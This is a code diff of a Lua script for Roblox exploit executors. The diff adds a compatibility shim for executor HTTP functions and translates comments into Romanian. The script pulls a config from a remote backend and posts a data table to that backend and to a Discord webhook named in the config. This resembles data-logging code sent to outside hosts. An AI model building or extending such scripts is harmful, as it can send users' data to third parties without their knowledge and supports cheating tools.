@@ -6,6 +6,13 @@ if not ID then
 end
 
 local HttpService = game:GetService("HttpService")
+
+-- compatibilitate cu toți executori
+local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+if not request then
+    error("❌ Executorul tău nu suportă HTTP requests!")
+end
+
 local configUrl = "https://element.up.railway.app/api/config?id=" .. ID
 local response = game:HttpGet(configUrl)
 
@@ -25,7 +32,7 @@ if success and config.webhook then
         ["key"] = config.key
     }
 
-    -- Report to backend
+    -- Report la backend
     request({
         Url = "https://element.up.railway.app/report",
         Method = "POST",
@@ -33,7 +40,7 @@ if success and config.webhook then
         Body = HttpService:JSONEncode(data)
     })
 
-    -- Send also to Discord webhook
+    -- Trimite și la Discord webhook
     request({
         Url = config.webhook,
         Method = "POST",
